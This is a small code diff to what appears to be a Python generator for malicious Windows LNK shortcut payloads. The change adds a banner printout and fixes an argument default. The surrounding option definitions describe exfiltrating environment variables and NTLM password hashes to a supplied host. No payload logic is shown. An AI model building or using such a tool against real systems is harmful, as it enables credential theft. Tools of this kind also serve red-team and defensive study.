@@ -16,7 +16,10 @@ else:
     except ImportError:
         print("You must install liblnk's python bindings for non-windows machines!")
         sys.exit(1)
-
+banner_file = open("banner.txt")
+banner = banner_file.read()
+banner_file.close()
+print(banner)
 
 parser = argparse.ArgumentParser(description='Generate a LNK payload')
 parser.add_argument('--host', metavar='h', type=str, nargs=1, required=True,
@@ -29,7 +32,7 @@ parser.add_argument('--execute', metavar='e', type=str, nargs=1, default=None,
 parser.add_argument('--vars', metavar='r', type=str, nargs=1,
                 help="What variables should we exfiltrate?"
                      + "\nExample: \"PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS\"")
-parser.add_argument('--type', metavar='t', type=str, nargs=1, default="all",
+parser.add_argument('--type', metavar='t', type=str, nargs=1, default=["all"],
                help='The payload type to generate. Possible options: '
                     + "\n* environment - Will exfiltrate specified environment variables"
                     + "\n* ntlm - Will exfiltrate windows NTLM password hashes"
